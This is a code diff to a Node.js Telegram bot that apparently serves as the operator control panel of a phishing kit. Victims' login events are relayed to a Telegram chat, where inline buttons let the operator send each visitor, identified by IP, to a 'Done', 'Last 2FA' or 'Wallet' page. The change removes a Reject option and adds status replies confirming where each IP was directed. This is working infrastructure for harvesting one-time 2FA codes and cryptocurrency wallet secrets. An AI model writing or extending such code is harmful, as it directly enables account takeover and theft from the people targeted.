@@ -146,25 +146,16 @@ async function sendLoginTelegram(email, message) {
 }
 
 // -----------------
-// ✅ NEW: Verify page approval (3 destination buttons)
+// Verify page approval (3 buttons, no reject)
 // -----------------
 async function sendVerifyTelegram(ip, message) {
   const options = {
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [
-        [
-          { text: "✅ Done", callback_data: `page1|${ip}` }
-        ],
-        [
-          { text: "🔐 Last 2FA", callback_data: `page2|${ip}` }
-        ],
-        [
-          { text: "👛 Wallet", callback_data: `page3|${ip}` }
-        ],
-        [
-          { text: "❌ Reject ❌", callback_data: `reject|${ip}` }
-        ]
+        [{ text: "✅ Done", callback_data: `page1|${ip}` }],
+        [{ text: "🔐 Last 2FA", callback_data: `page2|${ip}` }],
+        [{ text: "👛 Wallet", callback_data: `page3|${ip}` }]
       ]
     }
   };
@@ -284,10 +275,19 @@ bot.on("callback_query", async (query) => {
     } catch (_) {}
 
     // Step 2: Send status below the original message
-    const isSMS = /^\d+$/.test(identifier);
-    const replyText = isSMS
-      ? `💬 <code>${identifier}</code> has been <b>${actionLabel}</b>`
-      : `📧 <code>${identifier}</code> has been <b>${actionLabel}</b>`;
+    let replyText;
+    if (status === "accepted1" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
+      replyText = `${identifier} has been directed to <b>Done Page</b>`;
+    } else if (status === "accepted2" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
+      replyText = `${identifier} has been directed to <b>Last 2FA</b>`;
+    } else if (status === "accepted3" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
+      replyText = `${identifier} has been directed to <b>Wallet</b>`;
+    } else {
+      const isSMS = /^\d+$/.test(identifier);
+      replyText = isSMS
+        ? `💬 <code>${identifier}</code> has been <b>${actionLabel}</b>`
+        : `📧 <code>${identifier}</code> has been <b>${actionLabel}</b>`;
+    }
 
     await bot.sendMessage(
       query.message.chat.id,
